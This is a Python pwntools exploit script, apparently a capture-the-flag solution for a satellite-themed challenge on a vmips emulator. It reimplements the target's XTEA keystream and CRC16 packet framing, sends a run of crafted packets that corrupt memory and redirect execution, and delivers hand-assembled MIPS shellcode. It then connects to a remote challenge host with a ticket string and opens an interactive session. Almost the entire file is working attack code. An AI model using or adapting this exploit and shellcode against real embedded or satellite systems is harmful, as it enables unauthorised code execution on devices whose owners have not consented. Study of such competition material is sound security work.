from pwn import *
import time
import binascii
import os

key = 0x2E92F6BA62F88828147C0E2AE361D32C
iv1 = 0xCD4A05E8A0A3C10F
iv2 = 0x4CD435388058EFC7

def key_get(key, idx):
	return (key >> (idx*32)) & 0xffffffff

def xtea_do(data, key):
	v0 = data & 0xffffffff
	v1 = data >> 32
	sum = 0x3e778b90
	while sum != 0x7cef1720:
		temp = (sum + key_get(key, sum & 3)) & 0xffffffff
		sum = (sum + 0x83e778b9) & 0xffffffff
		v0 = (v0 + (temp ^ (v1 << 4 ^ v1 >> 5) + v1)) & 0xffffffff
		v1 = (v1 + (sum + (key_get(key, (sum >> 9 & 0xc) // 4)) ^ (v0 * 0x10 ^ v0 >> 5) + v0)) & 0xffffffff
	return (v1 << 32) | v0

def get_keystream_resource_rll(key, length):
	global iv2
	stream = b""
	for i in range(length):
		select = i & 7
		if select == 0:
			iv2 = xtea_do(iv2, key)
		stream += bytes([(iv2 >> (select*8)) & 0xff])
	return stream

def get_keystream_mac_rll(key, length):
	global iv1
	stream = b""
	for i in range(length):
		select = i & 7
		if select == 0:
			iv1 = xtea_do(iv1, key)
		stream += bytes([(iv1 >> (select*8)) & 0xff])
	return stream

def encrypt_message(msg):
	stream = get_keystream_mac_rll(key, len(msg))
	ret = b""
	for i in range(len(msg)):
		ret += bytes([stream[i] ^ msg[i]])
	return ret

def decrypt_message(msg):
	stream = get_keystream_resource_rll(key, len(msg))
	ret = b""
	for i in range(len(msg)):
		ret += bytes([stream[i] ^ msg[i]])
	return ret

def crc16(data: bytes, poly=0x8408):
    data = bytearray(data)
    crc = 0xFFFF
    for b in data:
        cur_byte = 0xFF & b
        for _ in range(0, 8):
            if (crc & 0x0001) ^ (cur_byte & 0x0001):
                crc = (crc >> 1) ^ poly
            else:
                crc >>= 1
            cur_byte >>= 1
    crc = (~crc & 0xFFFF)
    crc = (crc << 8) | ((crc >> 8) & 0xFF)
    return crc & 0xFFFF

cur_size = 0x20

def set_size_block(size):
	global cur_size
	data = bytes([size])
	data += b"A"*(cur_size-4)
	payload = b"\x79" + p16(crc16(data)) + data
	cur_size = size
	return payload

def message_block(data):
	if len(data) < cur_size - 3:
		fill = cur_size - 3 - len(data)
		#data += cyclic(0x500)[:fill]
		data += b"A"*fill
	if data[0] == 0x73 or data[0] == 0xc3:
		data = bytes([data[0]]) + encrypt_message(data[1:])
	crcl = crc16(data)
	sice = b"\xe3" + p16(crcl) + data
	return sice

def reset():
	global cur_size
	data = b"A"*(cur_size-3)
	crcl = crc16(data)
	sice = b"\x13" + p16(crcl) + data
	cur_size = 0x20
	return sice

res = []
res.append(set_size_block(0xc0))
res.append(message_block(b"\x17" + b"\x70" + b"B"))
#res.append(message_block(b"\xc3\x01" + p32(0x0) + b"\x20" + b"CCCCDDDDEEEEFFFF"))
#res.append(reset())
# 0x73 packet
# uint16 sn
# 
res.append(message_block(b"\x73\x0f\x80\x23" + b"\xfe"*0x10 + b"B"*0xa9))
res.append(message_block(b"\x73\x0e\x80\x23" + b"\xfe"*0x10 + b"B"*0xa9))
res.append(message_block(b"\x73\x0d\x80\x23" + b"\xfe"*0x10 + b"B"*0xa9))
res.append(message_block(b"\x73\x0c\x80\x23" + b"\xfe"*0x10 + b"B"*0xa9))
res.append(message_block(b"\x73\x0b\x80\x23" + b"\xfe"*0x10 + b"C"*0xa9))
res.append(message_block(b"\x73\x0a\x80\x23" + b"\xfe"*0x10 + b"C"*0xa9))
res.append(message_block(b"\x73\x09\x80\x23" + b"\xfe"*0x10 + b"C"*0xa9))
res.append(message_block(b"\x73\x08\x80\x23" + b"\xfe"*0x10 + b"C"*0xa9))
# 0x69696969 at a00fe778
# jump to a00fe77c
payload = b"\x73\x07\x80\x23\xfe" + b"\x00\x00\x00\x00"*4 + b"\xfe"*(0x10-5-4-4) + b"A"*0x1
payload += p32(0xa0110308)
#payload += b"\xFE\xFF\x00\x10" # shellchode
payload += b"\x00\x00\x00\x00"*0x5
payload += b"B"*(0xbd - len(payload))
# ram buffer 1 - a0110304
# jmp to a0110304 + 4
res.append(message_block(payload))
res.append(message_block(b"\x73\x06\x80\x23" + b"\xfe"*(0x10) + b"F"*0xa9))
res.append(message_block(b"\x73\x05\x80\x23\xfe" + b"\xfe\xff\x00\x10" + b"\xfe"*(0x10-5) + b"G"*0xa9))
res.append(message_block(b"\x73\x04\x80\x23" + b"\xfe"*0x10 + b"H"*0xa9))
res.append(message_block(b"\x73\x03\x80\x23" + b"\xfe"*0x10 + b"A"*0xa9))
res.append(message_block(b"\x73\x02\x80\x23" + b"\xfe"*0x10 + b"A"*0xa9))
res.append(message_block(b"\x73\x01\x80\x23" + b"\xfe"*0x10 + b"A"*0xa9))
#shellchode = b"\x00\x00\x00\x00" + b"\xFF\xFF\x00\x10"
# bigly communication  function = 0xbfc08cbc
# global data buf 0xa00fecfc
shellchode = b"\x00\x00\x07\x24\x04\x00\xA7\xAF\x04\x00\xA7\x8F\x20\x00\x09\x24\x17\x00\x27\x11\x00\x00\x00\x00\x00\x82\x02\x34\x00\x14\x02\x00\x00\x80\x42\x34\x80\x60\x07\x00\x20\x10\x4C\x00\x01\x00\xE7\x20\x04\x00\xA7\xAF\x00\x00\x43\x8C\x00\x00\xA3\xAF\x0F\xA0\x04\x34\x00\x24\x04\x00\xFC\xEC\x84\x34\x25\x28\xA0\x03\x26\x30\xC6\x00\x04\x00\x06\x24\xC0\xBF\x0B\x34\x00\x5C\x0B\x00\xBC\x8C\x6B\x35\x09\xF8\x60\x01\x00\x00\x00\x00\xE7\xFF\x00\x10\x00\x00\x00\x00"
shellchode += b"\x00\x00\x00\x00"
shellchode += b"\xFF\xFF\x00\x10"
assert len(shellchode) < 0xb6
shellchode += b"\x00"*(0xb6 - len(shellchode))
res.append(message_block(b"\x73\x00\x80\x23\xfe\xfe\xfe" + shellchode))


id1 = 0xef2c9fd1

#res.append(message_block(b"\xc3\x01" + p32(id1) + b"\xb0"*5))
#res.append(message_block(b"\xc3\x01" + p32(id1) + b"\xb0"*5))
#res.append(message_block(b"\xc3\x01" + p32(id1) + b"\xb0"*5))
#res.append(message_block(b"\xc3\x01" + p32(id1) + b"\xb0"*5))
#res.append(message_block(b"\xc3\x01" + p32(id1) + b"\xb0"*5))
#res.append(message_block(b"\xc3\x01" + p32(id1) + b"\xb0"*5))
#res.append(message_block(b"\xc3\x01" + p32(id1) + b"\xb0"*5))
#res.append(message_block(b"\xc3\x01" + p32(id1) + b"\xb0"*5))
#res.append(message_block(b"\xc3\x01" + p32(id1) + b"\xb0"*5))
#res.append(message_block(b"\xc3\x01" + p32(id1) + b"\xb0"*5))
#res.append(message_block(b"\xc3\x01" + p32(id1) + b"\xb0"*5))
#res.append(message_block(b"\xc3\x00\x00" + b"\x02"*0x10))
#res.append(message_block(b"\x73" + encrypt_message(b"\x00\x00\x00")))
#res.append(message_block(b"\xc3\x02" + p32(0x0) + b"\x20" + b"CCCCDDDDEEEEFFFF"))
#res.append(message_block(b"\x17" + b"\x70" + b"B"))
#res.append(message_block(b"\x73\x44\x44" + b"\x23"*0x30))
#res.append(message_block(b"\xc3" + encrypt_message(b"\x01AAAAAAAA")))

#r = process(["./vmips_patched", "-o", "memsize=2097152", "challenge_patched.rom"])
#r = process(["./vmips_patched", "-o", "memsize=2097152", "challenge.rom"])
#r = process(["./vmips", "-o", "memsize=2097152", "challenge_patched.rom"])
#r = process(["./vmips", "-o", "memsize=2097152", "challenge.rom"])
r = remote("launchlink.satellitesabove.me",5065)
r.recvline()
r.sendline("ticket{xray25235hotel:GFNqIcfJ-QGCTwRRjocGhg_tpNDdbbbj8jgH99WUW1_AGkw6Dlo_uEn9jf6K3i7DYw}")
time.sleep(1)
"""
r.recvuntil("*************RESET*************")
r.recvline()
r.recvline()
"""
for i in res:
	r.send(i)
	time.sleep(0.2)
r.interactive()
